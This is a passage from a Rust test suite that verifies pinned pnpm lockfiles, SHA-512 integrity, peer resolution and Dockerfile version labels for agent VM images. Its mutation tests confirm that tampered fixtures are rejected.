        let _ = std::fs::remove_dir_all(&self.directory);
    }
}

/// Every case recomputes the fixture pins, so a stale digest can never be the
/// reason a mutation is rejected; the expected diagnostic proves the intended
/// rule fired.
fn rejected_dsh_mutation(label: &str, mutate: impl FnOnce(&ProjectFixture), expected: &str) {
    let source = MigratedProject::committed("dsh", "images/tools/dsh");
    let fixture = ProjectFixture::copy(&source, label);
    mutate(&fixture);
    fixture.repin();
    let error = match read_graph(&fixture.project) {
        Ok(_) => panic!("{label}: the mutated dsh project must not validate"),
        Err(error) => error,
    };
    assert!(
        error.contains(expected),
        "{label}: expected {expected:?} in the rejection, got {error:?}"
    );
}

fn is_full_sha512(integrity: &str) -> bool {
    let Some(body) = integrity.strip_prefix("sha512-").map(str::as_bytes) else {
        return false;
    };
    body.len() == 88
        && body.ends_with(b"==")
        && body[..86]
            .iter()
            .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'+' || *byte == b'/')
}

/// Rewrite one lock mapping block selected by its header line. Selecting by
/// header keeps a mutation from silently hitting a different package that
/// happens to share the same inner lines.
fn edit_yaml_block(text: &str, header: &str, edit: impl FnOnce(&str) -> String) -> String {
    let start = text
        .find(header)
        .unwrap_or_else(|| panic!("missing block {header:?}"));
    let end = start + text[start..].find("\n\n").expect("block end");
    let block = &text[start..end];
    let mutated = edit(block);
    assert_ne!(mutated, block, "the block mutation must change {header:?}");
    format!("{}{}{}", &text[..start], mutated, &text[end..])
}

/// Effective peers are per snapshot: an exact declaration must match the
/// resolved edge, and a correct version existing elsewhere is not evidence.
/// Every case re-pins the mutated fixture, so a stale digest can never be the
/// reason a mutation is rejected.
#[test]
fn dsh_graph_and_effective_peer_mutations_are_rejected() {
    let graph = read_graph(&MigratedProject::committed("dsh", "images/tools/dsh"))
        .expect("the reviewed dsh inputs form a valid graph");
    let schemastery: Vec<&str> = graph
        .packages_named("@deepseek-ai/schemastery")
        .map(|entry| entry.version.as_str())
        .collect();
    assert_eq!(
        schemastery,
        ["3.18.2", "3.18.4"],
        "the peer mutation needs the correct version to exist globally"
    );

    rejected_dsh_mutation(
        "package-manager",
        |fixture| {
            fixture.rewrite("package.json", |text| {
                text.replacen("pnpm@11.11.0", "pnpm@11.10.0", 1)
            });
        },
        "pnpm@11.11.0",
    );

    rejected_dsh_mutation(
        "missing-integrity",
        |fixture| {
            fixture.rewrite("pnpm-lock.yaml", |text| {
                edit_yaml_block(text, "  '@deepseek-ai/dsh@0.1.5-rc.2':\n", |block| {
                    let mut lines: Vec<String> = block.lines().map(str::to_string).collect();
                    let index = lines
                        .iter()
                        .position(|line| line.trim_start().starts_with("resolution:"))
                        .expect("the archive declares a resolution");
                    lines[index] = "    resolution: {}".to_string();
                    lines.join("\n")
                })
            });
        },
        "missing key: integrity",
    );

    rejected_dsh_mutation(
        "bad-integrity",
        |fixture| {
            fixture.rewrite("pnpm-lock.yaml", |text| {
                edit_yaml_block(
                    text,
                    "  '@deepseek-ai/dsh-sandbox-local@0.1.5-rc.3':\n",
                    |block| block.replacen("sha512-ma3IB1EervDxQvaZRi5VIozCb+qbWF89i6p8uRdBLpnJHzLcuI/AKI7S3Hkcvuy2JQEUmWTaiaq4Eil8GY9JNQ==", "sha512-short", 1),
                )
            });
        },
        "full sha512 required",
    );

    rejected_dsh_mutation(
        "wrong-effective-peer",
        |fixture| {
            fixture.rewrite("pnpm-lock.yaml", |text| {
                edit_yaml_block(
                    text,
                    "  '@deepseek-ai/dsh-settings@0.1.5-rc.3':\n",
                    |block| {
                        block.replacen(
                            "'@deepseek-ai/schemastery': 3.18.2",
                            "'@deepseek-ai/schemastery': 3.18.4",
                            1,
                        )
                    },
                )
            });
        },
        "peer @deepseek-ai/schemastery wanted 3.18.4, got @deepseek-ai/schemastery@3.18.2",
    );

    rejected_dsh_mutation(
        "orphan",
        |fixture| {
            fixture.rewrite("pnpm-lock.yaml", |text| {
                let archive = format!(
                    "packages:\n\n  'orphan-fixture@1.0.0':\n    resolution: {{integrity: sha512-{}}}\n\n",
                    "A".repeat(86) + "=="
                );
                let with_archive = text.replacen("packages:\n\n", &archive, 1);
                with_archive.replacen(
                    "snapshots:\n\n",
                    "snapshots:\n\n  'orphan-fixture@1.0.0': {}\n\n",
                    1,
                )
            });
        },
        "orphan",
    );

    rejected_dsh_mutation(
        "absent-sandbox",
        |fixture| {
            fixture.rewrite("pnpm-lock.yaml", |text| {
                edit_yaml_block(
                    text,
                    "  '@deepseek-ai/dsh-sandbox-local@0.1.5-rc.3':\n",
                    |_| String::new(),
                )
            });
        },
        "dsh-sandbox-local",
    );
}

#[test]
fn the_pinned_dsh_version_agrees_across_the_manifest_and_the_lockfile() {
    let project = MigratedProject::committed("dsh", "images/tools/dsh");
    let manifest = read_json("images/tools/dsh/package.json");
    assert_eq!(manifest["name"], "agent-vm-dsh-layer");
    assert_eq!(manifest["private"], true);
    let dependencies = manifest["dependencies"]
        .as_object()
        .expect("the dsh manifest declares dependencies");
    let roots: Vec<&str> = dependencies.keys().map(String::as_str).collect();
    assert_eq!(roots, ["@deepseek-ai/dsh"], "the dsh project has one root");
    assert!(
        manifest.get("devDependencies").is_none(),
        "the dsh project declares no development root"
    );
    let base = read_json("images/pnpm/pin.json")["version"]
        .as_str()
        .expect("the base pin carries a version")
        .to_string();
    assert_eq!(
        manifest["packageManager"],
        format!("pnpm@{base}"),
        "packageManager asserts the base pin instead of selecting a second manager"
    );

    let graph = read_graph(&project).expect("the reviewed dsh inputs form a valid graph");
    assert_eq!(
        graph.version,
        dsh_pin(),
        "the manifest, the image label and the graph select one version"
    );
    assert_eq!(
        check_inputs(&project).expect("the CLI verifies every reviewed dsh input"),
        format!("{}\n", dsh_pin())
    );
    assert_eq!(graph.importer.len(), 1, "one imported root");
    let root = &graph.importer[0];
    assert_eq!(root.name, "@deepseek-ai/dsh");
    assert!(
        root.target
            .starts_with(&format!("@deepseek-ai/dsh@{}", dsh_pin())),
        "the imported root resolves to the pinned version: {}",
        root.target
    );
    assert!(
        graph.snapshots.iter().any(|entry| entry.key == root.target),
        "the imported root is a graph snapshot"
    );
    assert!(
        !project.carries_npm_lock(),
        "the dsh project owns no npm lock after the migration"
    );
}

#[test]
fn every_dsh_locked_package_carries_integrity() {
    let graph = read_graph(&MigratedProject::committed("dsh", "images/tools/dsh"))
        .expect("the reviewed dsh inputs form a valid graph");
    assert!(!graph.packages.is_empty(), "the report carries the graph");
    let dsh = graph
        .package("@deepseek-ai/dsh", &dsh_pin())
        .expect("the graph carries the selected dsh root");
    // Independently authored from the release metadata in the ticket, not from
    // this graph's own output.
    assert_eq!(
        dsh.integrity,
        "sha512-8Xc8hCQHcIWRmTCVU/xZdp6/qMsWMeAd2ObChKDEsfhUPJFXx6H0lgeb1DxUMD86HZrrVN+1bCvn1ppjZ/fOxw=="
    );
    assert_eq!(
        dsh.tarball, "https://registry.npmjs.org/@deepseek-ai/dsh/-/dsh-0.1.5-rc.2.tgz",
        "only the canonical npmjs resolver is allowed"
    );
    assert!(
        graph.carries("@deepseek-ai/dsh-sandbox-local"),
        "the private hoist's sandbox owner is part of the payload"
    );
    let missing: Vec<&str> = graph
        .packages
        .iter()
        .filter(|entry| !is_full_sha512(&entry.integrity))
        .map(|entry| entry.name.as_str())
        .collect();
    assert!(
        missing.is_empty(),
        "these graph packages carry no full sha512 integrity: {missing:?}"
    );
    // The additive projection is typed, not tolerated as loose JSON. These are
    // hand-authored expectations from the pinned lock, not this graph's output.
    assert!(dsh.has_bin, "the selected dsh root installs a bin");
    assert!(!dsh.optional, "the selected root archive is not optional");
    let sharp = graph
        .packages_named("@img/sharp-libvips-linux-arm64")
        .next()
        .expect("the graph carries the sharp libvips arm64 platform package");
    assert_eq!(sharp.platform.os, vec!["linux".to_string()]);
    assert_eq!(sharp.platform.cpu, vec!["arm64".to_string()]);
    assert_eq!(sharp.platform.libc, vec!["glibc".to_string()]);
    let optional_snapshots = graph
        .snapshots
        .iter()
        .filter(|entry| entry.optional)
        .count();
    assert_eq!(
        optional_snapshots, 70,
        "the pinned lock annotates exactly 70 optional snapshots"
    );
    assert!(
        graph.packages.iter().all(|entry| !entry.optional),
        "no archive-level optional flag is inferred from snapshot omissions"
    );
}

// ---------------------------------------------------------------------------
// Pi and the bridge: committed four-input projects read through the adapter
// ---------------------------------------------------------------------------

#[test]
fn pi_project_is_one_pinned_pnpm_root_read_by_the_graph_adapter() {
    let project = pi_project();
    let spec = PinSpec {
        dependency: "@earendil-works/pi-coding-agent",
    };
    check_project_shape(
        &project,
        "agent-vm-guest-pi",
        "@earendil-works/pi-coding-agent",
    )
    .expect("the Pi project is a private single-root pnpm project");
    let pinned = pinned_dependency(&project, &spec).expect("the Pi manifest pins its root");
    assert_eq!(
        pinned,
        version_label("pi", "AGENT_VERSION_PI"),
        "the manifest and the image label select one Pi version"
    );
    check_graph_pin_agrees(&project, &pinned).expect("the graph agrees with the label");
    let graph = read_graph(&project).expect("the reviewed Pi inputs form a valid graph");
    check_graph_integrity_and_reachability(&graph)
        .expect("every Pi archive is hashed, canonical and reachable");
    assert_eq!(
        graph.packages.len(),
        PI_DEFAULT_PACKAGES,
        "the reviewed default selection has {PI_DEFAULT_PACKAGES} archives; a different count \
         is a review event, not an invariant"
    );
    let root = graph
        .package("@earendil-works/pi-coding-agent", &pinned)
        .expect("the graph carries the selected Pi root");
    assert_eq!(root.integrity, PI_ROOT_INTEGRITY);
    assert!(
        root.has_bin,
        "the selected Pi root installs the bin the wrapper's PI_ENTRY links"
    );
    assert!(
        !project.carries_npm_lock(),
        "the migration deleted the npm lock"
    );
}

#[test]
fn pi_family_is_the_reviewed_shape_at_the_selected_version() {
    let project = pi_project();
    let graph = read_graph(&project).expect("the reviewed Pi inputs form a valid graph");
    check_pi_family(&graph).expect("the default selection is the reviewed modern six");
    let reachable = reachable_keys(&graph).expect("every root edge resolves");
    let family: Vec<&str> = reachable
        .iter()
        .copied()
        .filter(|key| {
            identity_of(&graph, key)
                .map(|id| id.0)
                .unwrap_or_default()
                .starts_with("@earendil-works/")
        })
        .collect();
    assert_eq!(
        family.len(),
        PI_FAMILY_MODERN.len() + 1,
        "the six siblings plus the root are the only @earendil-works identities"
    );
    for banned in ["chord", "esbuild"] {
        assert!(
            !graph.packages.iter().any(|archive| archive.name == banned),
            "{banned} belongs to the historical selection, not this one"
        );
    }
}

#[test]
fn pi_generated_bin_inventory_is_derived_from_locked_edges() {
    let project = pi_project();
    let graph = read_graph(&project).expect("the reviewed Pi inputs form a valid graph");
    // The reviewed table above is independent; this proves the graph's own
    // locked edges still derive it, which is what the byte checker normalises
    // against. `yaml` appears only in the historical selection's pi-agent-core.
    check_pi_generated_bins(&graph, &PI_GENERATED_BINS)
        .expect("the reviewed family derives exactly the reviewed bin inventory");
}

#[test]
fn bridge_is_hoisted_javascript_sdk_without_aliases_or_payloads() {
    let project = bridge_project();
    let spec = PinSpec {
        dependency: "pi-claude-bridge",
    };
    check_project_shape(&project, "agent-vm-guest-pi-packages", "pi-claude-bridge")
        .expect("the bridge project is a private single-root pnpm project");
    let pinned = pinned_dependency(&project, &spec).expect("the bridge manifest pins its root");
    assert_eq!(
        pinned,
        version_label("pi-claude-bridge", "AGENT_VERSION_PI_CLAUDE_BRIDGE"),
        "the manifest and the image label select one bridge version"
    );
    check_graph_pin_agrees(&project, &pinned).expect("the graph agrees with the label");
    let workspace = std::fs::read_to_string(project.input("pnpm-workspace.yaml"))
        .expect("the bridge workspace is readable");
    assert!(
        workspace.contains("nodeLinker: hoisted"),
        "the reviewed bridge layout is hoisted so Pi's jiti loader can resolve the SDK"
    );
    assert!(
        workspace.contains("ignoredOptionalDependencies: ['@anthropic-ai/claude-agent-sdk-*']"),
        "the only reviewed bridge omission is the SDK platform payloads"
    );
    let graph = read_graph(&project).expect("the reviewed bridge inputs form a valid graph");
    check_graph_integrity_and_reachability(&graph)
        .expect("every bridge archive is hashed, canonical and reachable");
    assert_eq!(
        graph.packages.len(),
        BRIDGE_DEFAULT_PACKAGES,
        "the reviewed bridge graph is the {BRIDGE_DEFAULT_PACKAGES} nonoptional identities; a \
         different count is a review event"
    );
    let root = graph
        .package("pi-claude-bridge", &pinned)
        .expect("the graph carries the selected bridge root");
    assert_eq!(root.integrity, BRIDGE_ROOT_INTEGRITY);
    check_bridge_sdk_omission(&graph).expect("the SDK JavaScript stays and its payloads do not");
    check_no_loader_aliased_pi_package(&graph)
        .expect("the bridge installs no package Pi's loader aliases");
    // A peer **declaration** is legitimate and required: Pi supplies that peer
    // through jiti, so only an installed identity would be a defect.
    let declared = graph
        .packages
        .iter()
        .find(|archive| archive.name == "pi-claude-bridge")
        .is_some_and(|archive| {
            archive
                .peers
                .iter()
                .any(|(name, _)| name == "@earendil-works/pi-coding-agent")
        });
    assert!(
        declared,
        "the bridge declares the image's Pi as a peer range (information, not a resolution)"
    );
}

#[test]
fn pi_and_bridge_graph_mutations_are_rejected() {
    // Re-pinned lock mutations: the workspace policy, the SRI grammar and the
    // archive identity are the adapter's own gates, so each is edited in the
    // lock and re-pinned as test data.
    {
        let bridge = bridge_project();
        rejected_graph_mutation(
            &bridge,
            "bridge-node-linker",
            |fixture| {
                fixture.rewrite("pnpm-workspace.yaml", |text| {
                    text.replacen("nodeLinker: hoisted", "nodeLinker: isolated", 1)
                });
            },
            "workspace policy: nodeLinker",
        );
        rejected_graph_mutation(
            &bridge,
            "bridge-optional-omission",
            |fixture| {
                fixture.rewrite("pnpm-workspace.yaml", |text| {
                    text.replacen(
                        "ignoredOptionalDependencies: ['@anthropic-ai/claude-agent-sdk-*']",
                        "ignoredOptionalDependencies: []",
                        1,
                    )
                });
            },
            "workspace policy: ignoredOptionalDependencies",
        );
        rejected_graph_mutation(
            &bridge,
            "bridge-missing-integrity",
            |fixture| {
                fixture.rewrite("pnpm-lock.yaml", |text| {
                    edit_yaml_block(text, "  hono@4.13.8:\n", |block| {
                        let mut lines: Vec<String> = block.lines().map(str::to_string).collect();
                        let index = lines
                            .iter()
                            .position(|line| line.trim_start().starts_with("resolution:"))
                            .expect("the archive declares a resolution");
                        lines[index] = "    resolution: {}".to_string();
                        lines.join("\n")
                    })
                });
            },
            "missing key: integrity",
        );
        rejected_graph_mutation(
            &bridge,
            "bridge-short-sri",
            |fixture| {
                fixture.rewrite("pnpm-lock.yaml", |text| {
                    edit_yaml_block(text, "  express@5.2.1:\n", |block| {
                        edit_resolution_integrity(block, "sha512-short")
                    })
                });
            },
            "full sha512 required",
        );
    }
    {
        let pi = pi_project();
        rejected_graph_mutation(
            &pi,
            "pi-trust-exception",
            |fixture| {
                fixture.rewrite("pnpm-workspace.yaml", |text| {
                    text.replacen(
                        "trustPolicyExclude: ['undici-types@6.21.0']",
                        "trustPolicyExclude: []",
                        1,
                    )
                });
            },
            "workspace policy: trustPolicyExclude",
        );
        rejected_graph_mutation(
            &pi,
            "pi-peer-automation",
            |fixture| {
                fixture.rewrite("pnpm-workspace.yaml", |text| {
                    text.replacen("autoInstallPeers: true", "autoInstallPeers: false", 1)
                });
            },
            "workspace policy: autoInstallPeers",
        );
    }

    // Independent expectation mutants: the family shape, the per-identity SRI,
    // the alias rule and the SDK omission are Rust-authored controls, so they are
    // exercised on typed graph copies rather than on the lock.
    {
        let pi = pi_project();
        let graph = read_graph(&pi).expect("the reviewed Pi inputs form a valid graph");
        check_pi_family(&graph).expect("the committed family passes");
        check_pi_generated_bins(&graph, &PI_GENERATED_BINS).expect("the committed bins pass");
        check_graph_integrity_and_reachability(&graph).expect("the committed graph passes");

        let root_key = graph.importer[0].target.clone();
        let drop_member = |name: &str| {
            let mut mutated = graph.clone();
            mutated.snapshots.retain(|entry| entry.name != name);
            mutated.packages.retain(|entry| entry.name != name);
            for snapshot in &mut mutated.snapshots {
                if snapshot.key == root_key {
                    snapshot.edges.retain(|edge| edge.name != name);
                }
            }
            mutated
        };
        let four = drop_member("@earendil-works/pi-mcp");
        let error =
            check_pi_family(&four).expect_err("a five-member modern family is not reviewed");
        assert!(
            error.contains("neither the modern") && error.contains("nor the historical"),
            "the family-shape control must name both reviewed shapes: {error:?}"
        );
        let missing_ai = drop_member("@earendil-works/pi-ai");
        assert!(
            check_pi_family(&missing_ai).is_err(),
            "dropping a sibling the modern table requires must fail"
        );

        let mut optional_only = graph.clone();
        for snapshot in &mut optional_only.snapshots {
            if snapshot.name == "@earendil-works/pi-telemetry" {
                snapshot.version = "1.4.0".to_string();
            }
            for edge in &mut snapshot.edges {
                if edge.name == "@earendil-works/pi-telemetry" {
                    edge.optional = true;
                }
            }
        }
        let error = check_pi_family(&optional_only)
            .expect_err("a family member behind an optional edge must fail the family control");
        assert!(error.contains("only through an optional edge"), "{error:?}");

        let mut wrong_version = graph.clone();
        for snapshot in &mut wrong_version.snapshots {
            if snapshot.name == "@earendil-works/pi-tui" {
                snapshot.version = "0.0.0".to_string();
            }
        }
        let error = check_pi_family(&wrong_version).expect_err("a re-pinned sibling version fails");
        assert!(
            error.contains("the selection is"),
            "the version control must name the selection: {error:?}"
        );

        let mut duplicate_context = graph.clone();
        let sibling = graph
            .snapshots
            .iter()
            .find(|entry| entry.name == "@earendil-works/pi-tui")
            .expect("pi-tui is reachable")
            .clone();
        let mut second = sibling.clone();
        second.key = format!("{}(@fixture/peer@1.0.0)", sibling.key);
        duplicate_context.snapshots.push(second);
        for snapshot in &mut duplicate_context.snapshots {
            if snapshot.key == root_key {
                snapshot.edges.push(GraphEdge {
                    name: "@earendil-works/pi-tui".to_string(),
                    target: sibling.key.clone() + "(@fixture/peer@1.0.0)",
                    optional: false,
                });
            }
        }
        let error = check_pi_family(&duplicate_context)
            .expect_err("a second peer context of one sibling is a substitution");
        assert!(
            error.contains("more than one peer context"),
            "the context control must name the duplicate: {error:?}"
        );

        let mut blank_sri = graph.clone();
        if let Some(archive) = blank_sri
            .packages
            .iter_mut()
            .find(|archive| archive.name == "@earendil-works/pi-tui")
        {
            archive.integrity = String::new();
        }
        let error = check_graph_integrity_and_reachability(&blank_sri)
            .expect_err("a sibling without SRI must fail the integrity control");
        assert!(error.contains("full sha512"), "{error:?}");

        let mut orphan = graph.clone();
        orphan.packages.push(GraphArchive {
            name: "@earendil-works/pi-fixture".to_string(),
            version: "1.0.0".to_string(),
            integrity: PI_ROOT_INTEGRITY.to_string(),
            tarball: "https://registry.npmjs.org/@earendil-works/pi-fixture/-/pi-fixture-1.0.0.tgz"
                .to_string(),
            has_bin: false,
            platform: GraphPlatform {
                os: Vec::new(),
                cpu: Vec::new(),
                libc: Vec::new(),
            },
            optional: false,
            peers: Vec::new(),
        });
        let error = check_graph_integrity_and_reachability(&orphan)
            .expect_err("an archive with no reviewed edge must fail reachability");
        assert!(error.contains("orphan archive"), "{error:?}");
    }

    {
        let bridge = bridge_project();
        let graph = read_graph(&bridge).expect("the reviewed bridge inputs form a valid graph");
        check_bridge_sdk_omission(&graph).expect("the committed bridge passes");
        check_no_loader_aliased_pi_package(&graph).expect("the committed bridge has no alias");

        let mut aliased = graph.clone();
        aliased.packages.push(GraphArchive {
            name: "@earendil-works/pi-ai".to_string(),
            version: "1.4.0".to_string(),
            integrity: PI_ROOT_INTEGRITY.to_string(),
            tarball: "https://registry.npmjs.org/@earendil-works/pi-ai/-/pi-ai-1.4.0.tgz"
                .to_string(),
            has_bin: true,
            platform: GraphPlatform {
                os: Vec::new(),
                cpu: Vec::new(),
                libc: Vec::new(),
            },
            optional: false,
            peers: Vec::new(),
        });
        let error = check_no_loader_aliased_pi_package(&aliased)
            .expect_err("a second Pi identity must fail the alias control");
        assert!(error.contains("loader aliases"), "{error:?}");

        let mut no_sdk = graph.clone();
        no_sdk
            .packages
            .retain(|archive| archive.name != "@anthropic-ai/claude-agent-sdk");
        let error = check_bridge_sdk_omission(&no_sdk)
            .expect_err("a bridge without the SDK JavaScript is broken");
        assert!(error.contains("Claude Agent SDK JavaScript"), "{error:?}");

        let mut payload = graph.clone();
        payload.packages.push(GraphArchive {
            name: "@anthropic-ai/claude-agent-sdk-linux-x64".to_string(),
            version: "0.3.281".to_string(),
            integrity: BRIDGE_SDK_INTEGRITY.to_string(),
            tarball: "https://registry.npmjs.org/@anthropic-ai/claude-agent-sdk-linux-x64/-/claude-agent-sdk-linux-x64-0.3.281.tgz".to_string(),
            has_bin: false,
            platform: GraphPlatform {
                os: vec!["linux".to_string()],
                cpu: vec!["x64".to_string()],
                libc: Vec::new(),
            },
            optional: true,
            peers: Vec::new(),
        });
        let error = check_bridge_sdk_omission(&payload)
            .expect_err("a re-added SDK platform payload must fail the omission control");
        assert!(error.contains("omitted SDK platform payloads"), "{error:?}");

        let mut moved_sdk = graph.clone();
        for archive in &mut moved_sdk.packages {
            if archive.name == "@anthropic-ai/claude-agent-sdk" {
                archive.integrity = PI_ROOT_INTEGRITY.to_string();
            }
        }
        let error = check_bridge_sdk_omission(&moved_sdk)
            .expect_err("a re-pinned SDK identity must fail the reviewed-SRI control");
        assert!(error.contains("not the reviewed"), "{error:?}");
    }
}

/// The image label's `ARG` fallback for one product, i.e. the version the label
/// publishes when the build does not override it. The manifest pin must equal it.
fn version_label(product: &str, arg: &str) -> String {
    let dockerfile = standard_dockerfile();
    let value = label_value(&dockerfile, &format!("org.agent-vm.version.{product}"));
    value
        .strip_prefix(&format!("${{{arg}:-"))
        .and_then(|rest| rest.strip_suffix('}'))
        .unwrap_or_else(|| panic!("the {product} label does not fall back to {arg}: {value}"))
        .to_string()
}

/// Replace one archive block's SRI, leaving the rest of the block alone.
fn edit_resolution_integrity(block: &str, integrity: &str) -> String {
    let mut lines: Vec<String> = block.lines().map(str::to_string).collect();
    let index = lines
        .iter()
        .position(|line| line.trim_start().starts_with("resolution:"))
        .expect("the archive declares a resolution");
    lines[index] = format!("    resolution: {{integrity: {integrity}}}");
    lines.join("\n")
}

// ---------------------------------------------------------------------------
// Exact shipped version slots: ARGs, labels, recipe sources
// ---------------------------------------------------------------------------

const RECIPES: [&str; 6] = ["dsh", "pi", "codex", "opencode", "claude", "copilot"];

/// Eight standard-owned selections; pnpm is inherited from base.
const VERSION_SLOTS: [(&str, &str); 8] = [
    ("codex", "AGENT_VERSION_CODEX"),
    ("opencode", "AGENT_VERSION_OPENCODE"),
    ("claude", "AGENT_VERSION_CLAUDE"),
    ("copilot", "AGENT_VERSION_COPILOT"),
    ("dsh", "AGENT_VERSION_DSH"),
    ("pi", "AGENT_VERSION_PI"),
    ("pi-claude-bridge", "AGENT_VERSION_PI_CLAUDE_BRIDGE"),
    ("opencode-claude", "AGENT_VERSION_OPENCODE_CLAUDE"),
];

fn standard_dockerfile() -> String {
    read_text("images/standard/Dockerfile")
}

/// The one `ARG NAME=<value>` line's value (panics unless exactly one).
fn dockerfile_arg(text: &str, name: &str) -> String {
    let prefix = format!("ARG {name}=");
    let matches: Vec<&str> = text
        .lines()
        .map(str::trim)
        .filter(|line| line.starts_with(&prefix))
        .collect();
    assert_eq!(
        matches.len(),
        1,
        "expected exactly one `ARG {name}=` line, found {}: {matches:?}",
        matches.len()
    );
    matches[0][prefix.len()..].to_string()
}

/// The active `LABEL` key=value pairs of a Dockerfile, parsed the way a build
/// would see them. Comment lines are dropped before instruction joining, and a
/// trailing `\` joins the next line, so a commented-out or continued label is
/// resolved exactly as the built image resolves it.
fn active_label_values(text: &str) -> Vec<(String, String)> {
    let stripped: Vec<&str> = text
        .lines()
        .filter(|line| !line.trim_start().starts_with('#'))
        .collect();
    let mut logical: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut continuing = false;
    for line in stripped {
        let line = line.trim();
        if continuing {
            current.push(' ');
        } else {
            current.clear();
        }
        current.push_str(line);
        if current.ends_with('\\') {
            current.pop();
            continuing = true;
        } else {
            logical.push(std::mem::take(&mut current));
            continuing = false;
        }
    }
    if !current.is_empty() {
        logical.push(current);
    }
    let mut pairs = Vec::new();
    for instruction in logical {
        let (verb, rest) = match instruction.split_once(char::is_whitespace) {
            Some(parts) => parts,
            None => continue,
        };
        if !verb.eq_ignore_ascii_case("LABEL") {
            continue;
        }
        pairs.extend(label_pairs(rest));
    }
    pairs
}

/// Split a `LABEL` body into `key=value` pairs; a quoted value keeps its bytes.
fn label_pairs(body: &str) -> Vec<(String, String)> {
    let mut pairs = Vec::new();
    let mut chars = body.chars().peekable();
    while chars.peek().is_some() {
        while matches!(chars.peek(), Some(c) if c.is_whitespace()) {
            chars.next();
        }
        let mut key = String::new();
        while let Some(&c) = chars.peek() {
            if c == '=' || c.is_whitespace() {
                break;
            }
            key.push(c);
            chars.next();
        }
        if key.is_empty() {
            break;
        }
        if chars.peek() != Some(&'=') {
            continue;
        }
        chars.next();
        let mut value = String::new();
        if chars.peek() == Some(&'"') {
            chars.next();
            while let Some(c) = chars.next() {
                if c == '"' {
                    break;
                }
                if c == '\\' {
                    if let Some(escaped) = chars.next() {
                        value.push(escaped);
                    }
                } else {
                    value.push(c);
                }
            }
        } else {
            while let Some(&c) = chars.peek() {
                if c.is_whitespace() {
                    break;
                }
                value.push(c);
                chars.next();
            }
        }
        pairs.push((key, value));
    }
    pairs
}

/// The value of the single ACTIVE `LABEL KEY="..."`, or `None` when absent. A
/// duplicate active label is a failure (there is no defensible selection).
fn find_label_value(text: &str, key: &str) -> Option<String> {
    let values: Vec<String> = active_label_values(text)
        .into_iter()
        .filter(|(candidate, _)| candidate == key)
        .map(|(_, value)| value)
        .collect();
    match values.len() {
        0 => None,
        1 => Some(values.into_iter().next().expect("one value")),
        n => panic!("the {key} label must appear exactly once, found {n}"),
    }
}

fn label_value(text: &str, key: &str) -> String {
    find_label_value(text, key).unwrap_or_else(|| panic!("the {key} label is present"))
}

/// The active `org.agent-vm.version.*` keys of a Dockerfile.
fn active_version_labels(text: &str) -> Vec<String> {
    active_label_values(text)
        .into_iter()
        .map(|(key, _)| key)
        .filter(|key| key.starts_with("org.agent-vm.version."))
        .collect()
}

/// Canonical semver 2.0.0 parsing of the exact slot the owning hook accepts:
/// each core identifier is numeric with no leading zero; a pre-release
/// identifier is numeric (no leading zero) or alphanumeric; a build identifier
/// is digits (leading zeros allowed) or alphanumeric.
fn is_exact_semver(body: &str) -> bool {
    fn numeric(s: &str) -> bool {
        !s.is_empty() && s.chars().all(|c| c.is_ascii_digit()) && (s == "0" || !s.starts_with('0'))
    }
    fn digits(s: &str) -> bool {
        !s.is_empty() && s.chars().all(|c| c.is_ascii_digit())
    }
    fn alphanumeric(s: &str) -> bool {
        !s.is_empty()
            && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
            && s.chars().any(|c| !c.is_ascii_digit())
    }
    let (core_and_pre, build) = match body.split_once('+') {
        Some((head, build)) => (head, Some(build)),
        None => (body, None),
    };
    let (core, pre) = match core_and_pre.split_once('-') {
        Some((core, pre)) => (core, Some(pre)),
        None => (core_and_pre, None),
    };
    let core_ids: Vec<&str> = core.split('.').collect();
    if core_ids.len() != 3 || !core_ids.iter().all(|id| numeric(id)) {
        return false;
    }
    if pre.is_some_and(|p| p.is_empty() || !p.split('.').all(|id| numeric(id) || alphanumeric(id)))
    {
        return false;
    }
    if build.is_some_and(|b| b.is_empty() || !b.split('.').all(|id| digits(id) || alphanumeric(id)))
    {
        return false;
    }
    true
}

fn assert_exact_slot(value: &str, prefix: &str) {
    assert!(!value.is_empty(), "a selected slot must not be empty");
    let body = value
        .strip_prefix(prefix)
        .unwrap_or_else(|| panic!("the slot must start with {prefix:?}: {value:?}"));
    assert!(
        is_exact_semver(body),
        "the slot must be an exact semver version: {value:?}"
    );
    for forbidden in ['^', '~', '>', '<', '=', '*', '|', ' ', 'x', 'X', '@', '/'] {
        assert!(
            !value.contains(forbidden),
            "the slot must be exact, not a range/tag/URL: {value:?}"
        );
    }
}

#[test]
fn single_slot_recipes_pin_an_exact_default_and_reference_it_in_the_label() {
    let text = standard_dockerfile();
    for (label, arg) in &VERSION_SLOTS[..4] {
        let value = dockerfile_arg(&text, arg);
        match *label {
            "codex" => assert_exact_slot(&value, "rust-v"),
            "opencode" => {
                assert_exact_slot(&value, "v");
                assert!(value.starts_with("v2."), "OpenCode major 2 only");
            }
            _ => assert_exact_slot(&value, ""),
        }
        assert_eq!(
            label_value(&text, &format!("org.agent-vm.version.{label}")),
            format!("${{{arg}}}"),
            "standard: the version label must reference {arg}"
        );
    }
}

#[test]
fn multi_slot_args_are_empty_and_label_fallbacks_mirror_the_manifests() {
    let dsh = standard_dockerfile();
    assert_eq!(dockerfile_arg(&dsh, "AGENT_VERSION_DSH"), "");
    assert_eq!(dockerfile_arg(&dsh, "AGENT_VERSION_PNPM"), "");
    let base_pnpm = read_json("images/pnpm/pin.json")["version"]
        .as_str()
        .expect("the base pin carries a version")
        .to_string();
    assert_eq!(
        label_value(&dsh, "org.agent-vm.version.dsh"),
        format!("${{AGENT_VERSION_DSH:-{}}}", dsh_pin()),
        "the dsh label fallback must mirror images/tools/dsh/package.json"
    );
    assert_eq!(
        label_value(&read_text("images/Dockerfile"), "org.agent-vm.version.pnpm"),
        base_pnpm,
        "the inherited base pnpm label must mirror the base pin"
    );

    let pi = standard_dockerfile();
    assert_eq!(dockerfile_arg(&pi, "AGENT_VERSION_PI"), "");
    assert_eq!(dockerfile_arg(&pi, "AGENT_VERSION_PI_CLAUDE_BRIDGE"), "");
    assert_eq!(
        label_value(&pi, "org.agent-vm.version.pi"),
        format!("${{AGENT_VERSION_PI:-{}}}", pi_pin()),
        "the pi label fallback must mirror images/tools/pi/package.json"
    );
    assert_eq!(
        label_value(&pi, "org.agent-vm.version.pi-claude-bridge"),
        format!("${{AGENT_VERSION_PI_CLAUDE_BRIDGE:-{}}}", bridge_pin()),
        "the bridge label fallback must mirror images/tools/pi/bridge/package.json"
    );
}

#[test]
